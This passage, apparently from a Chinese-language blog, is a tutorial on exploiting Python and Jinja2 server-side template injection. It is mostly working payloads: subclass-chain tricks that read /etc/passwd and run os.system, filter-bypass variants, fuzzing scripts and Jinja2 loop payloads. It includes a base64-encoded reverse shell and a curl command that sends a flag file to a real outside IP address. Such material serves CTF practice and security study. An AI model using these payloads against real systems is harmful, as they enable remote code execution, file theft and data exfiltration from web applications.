&#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;urlparse.ResultMixin&#39;&gt;, &lt;type &#39;collections.deque&#39;&gt;, &lt;type &#39;deque_iterator&#39;&gt;, &lt;type &#39;deque_reverse_iterator&#39;&gt;, &lt;type &#39;operator.itemgetter&#39;&gt;, &lt;type &#39;operator.attrgetter&#39;&gt;, &lt;type &#39;operator.methodcaller&#39;&gt;, &lt;type &#39;itertools.combinations&#39;&gt;, &lt;type &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;type &#39;itertools.cycle&#39;&gt;, &lt;type &#39;itertools.dropwhile&#39;&gt;, &lt;type &#39;itertools.takewhile&#39;&gt;, &lt;type &#39;itertools.islice&#39;&gt;, &lt;type &#39;itertools.starmap&#39;&gt;, &lt;type &#39;itertools.imap&#39;&gt;, &lt;type &#39;itertools.chain&#39;&gt;, &lt;type &#39;itertools.compress&#39;&gt;, &lt;type &#39;itertools.ifilter&#39;&gt;, &lt;type &#39;itertools.ifilterfalse&#39;&gt;, &lt;type &#39;itertools.count&#39;&gt;, &lt;type &#39;itertools.izip&#39;&gt;, &lt;type &#39;itertools.izip_longest&#39;&gt;, &lt;type &#39;itertools.permutations&#39;&gt;, &lt;type &#39;itertools.product&#39;&gt;, &lt;type &#39;itertools.repeat&#39;&gt;, &lt;type &#39;itertools.groupby&#39;&gt;, &lt;type &#39;itertools.tee_dataobject&#39;&gt;, &lt;type &#39;itertools.tee&#39;&gt;, &lt;type &#39;itertools._grouper&#39;&gt;, &lt;type &#39;_thread._localdummy&#39;&gt;, &lt;type &#39;thread._local&#39;&gt;, &lt;type &#39;thread.lock&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;type &#39;_io._IOBase&#39;&gt;, &lt;type &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;type &#39;_hashlib.HASH&#39;&gt;, &lt;type &#39;_random.Random&#39;&gt;, &lt;type &#39;cStringIO.StringO&#39;&gt;, &lt;type &#39;cStringIO.StringI&#39;&gt;, &lt;type &#39;time.struct_time&#39;&gt;] 4、文件读取 Payload 1 发现40的地方存在 &lt;type &#39;file&#39;&gt; 12&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()request.__class__.__mro__[1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 查下标 1[().__class__.__bases__[0].__subclasses__()[i].__name__ for i in range(len(().__class__.__bases__[0].__subclasses__()))].index(&#39;file&#39;) 1234567#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[2].__subclasses__(): print num print item num+=1 Payload 2 1259&lt;class &#39;warnings.catch_warnings&#39;&gt; 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 5、命令执行 寻找包含os模块的脚本 1234567891011#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[-1].__subclasses__(): try: if 'os' in item.__init__.__globals__: print num,item num+=1 except: print '-' num+=1 得到 12345671 &lt;class &#39;site._Printer&#39;&gt;----76 &lt;class &#39;site.Quitter&#39;&gt; 前面已经找到了包含os模块的类，先初始化，再引用即可 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) 只不过命令执行没有回显，需要反弹shell或者利用curl带出 反弹shell 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash&#39;) curl带出 1&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;data&#x3D;$(cat &#x2F;fffffflag | base64);curl http:&#x2F;&#x2F;117.78.1.204&#x2F;?data&#x3D;$data;&#39;) catch_warnings也可以进一步构造来执行命令 1259&lt;class &#39;warnings.catch_warnings&#39;&gt; 先介绍两个属性，已知函数名可获取函数信息 1234567891011def fun(x&#x3D;1): # nothing here a&#x3D;x*2 flag&#x3D;&#39;neko&#39; return aprint fun.func_code.co_constsprint fun.func_globals&#x3D;&gt;(None, 2, &#39;neko&#39;)&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;b.py&#39;, &#39;__package__&#39;: None, &#39;fun&#39;: &lt;function fun at 0x7f1b9317e750&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None&#125; 可构造 1[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;) 还有几种变形 1234567891011__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&quot;l&quot;+&quot;s&quot;)__builtins__.__dict__[&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;)).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&#39;l&#39;+&#39;s&#39;)[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;ls&#39;)[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&#39;ls&#39;)&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;))()&#125; Python3Python 3.7.5 1、获取类对象 123456&gt;&gt;&gt; &#39;&#39;.__class__&lt;class &#39;str&#39;&gt;&gt;&gt;&gt; ().__class__&lt;class &#39;tuple&#39;&gt;&gt;&gt;&gt; [].__class__&lt;class &#39;list&#39;&gt; 2、寻找基类object 1234567&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;class &#39;list&#39;&gt;, &lt;class &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;class &#39;object&#39;&gt; 3、寻找可用的引用 12&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;rlcompleter.Completer&#39;&gt;] 4、文件读取/命令执行 3个本地测试成功的payload 123().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;) 12345693&lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;127&lt;class &#39;os._wrap_close&#39;&gt;-1&lt;class &#39;rlcompleter.Completer&#39;&gt; 通过观察，其实就是__global__中存在sys或者system或者__builtins__模块 FUZZ脚本 1234567891011121314#!/usr/bin/env python# encoding: utf-8for item in ().__class__.__bases__[0].__subclasses__(): try: if 'system' in item.__init__.__globals__: print('system',num,item) if 'sys' in item.__init__.__globals__: print('sys',num,item) if '__builtins__' in item.__init__.__globals__: print('__builtins__',num,item) num+=1 except: print '-' num+=1 fuzz出很多其他的，测试一下 尝试自己构造for循环 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if &#39;sys&#39; in c.__init__.__globals__ %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 一个0代表执行一次🤦‍♂️，命令执行的结果无法回显，利用curl带出 当然也可以指定模块名，就可以只执行一次，比如前面FUZZ出来的 1sys 128 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; 注意是后半部分Quitter 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 上面三个模块中__builtins__最为丰富 12345[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() 比如还有chr()函数 Jinja2的for循环处理 123&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; eval执行的好处是直接有回显， Some Tricks（测试环境为Py2）.被过滤 1[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;) 使用getattr() 123456[].__class__ &#x3D;&gt; getattr([],&#39;__class__&#39;)[].__class__.__base__ &#x3D;&gt; getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;)[].__class__.__base__.__subclasses__()[59] &#x3D;&gt; getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59][].__class__.__base__.__subclasses__()[59].__init__ &#x3D;&gt; getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;)...getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;),&#39;__globals__&#39;)[&#39;linecache&#39;],&#39;__dict__&#39;)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;) _被过滤 1getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;base&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;linecache&#39;],dir(0)[0][0]*2+&#39;dict&#39;+dir(0)[0][0]*2)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;) 中括号被过滤 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 可以用getitem和pop进行绕过过滤 1&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(58).__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 引号被过滤 先获取chr()再将文件名拼接 1&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125; 过滤双括号)) 利用文件盲注 1&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;aa&#39;).read()[0:1]&#x3D;&#x3D;&#39;f&#39; %&#125;~ok~&#123;% endif %&#125; 写个脚本即可 总结通用的payload 基类 12&#39;&#39;.__class__.__mro__[-1]().__class__.__base__ Python 2.7 &lt;type &#39;file&#39;&gt; 下标一般是40，如果不行的话也可爆破试试 1&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() os、__builtins__、linecache模块 寻找相应模块.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['os', '__builtins__', 'linecache']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;)&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) 这里有很多变形可以参考上面的 jinja2的for循环一把梭 12345&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Python 3.7 sys、system、__builtins__模块，其中__builtins__和python2的略有不同 寻找相应模块.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['sys', '__builtins__', 'system']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) jinja2的for循环一把梭 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ======================分割线 安恒杯抗疫月赛 没打比赛，似乎是过滤了.和_， 我想到的payload 1getattr(getattr(getattr(getattr(getattr(&#39;&#39;,dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;mro&#39;+dir(0)[0][0]*2)[-1],dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[127],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;system&#39;](&#39;ls&#39;) 赛后看到下面两个payload payload1，利用16进制编码 